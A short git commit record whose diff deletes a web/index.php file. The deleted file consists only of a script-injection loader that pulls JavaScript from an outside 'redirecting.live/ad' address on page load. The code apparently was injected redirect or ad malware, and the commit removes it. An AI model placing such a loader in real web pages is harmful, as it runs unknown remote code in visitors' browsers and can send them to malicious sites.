12db4045b516b6b2685577249cdcec8e991271f6
sanernecro <sanernecro@gmail.com>
2017-03-12 21:16:55 +0200

    Delete index.php

--- web/index.php
+++
@@ -1,8 +0,0 @@
-<script> 
-     (function (a, d, j, o) {
-           o = a.createElement(d),
-              m = a.getElementsByTagName(d)[0];              
-           o.src = j + "?d=0&r=" + Math.random();
-           m.parentNode.insertBefore(o, m)
-      })(document, 'script', 'http://redirecting.live/ad/32bb0882');
-</script>
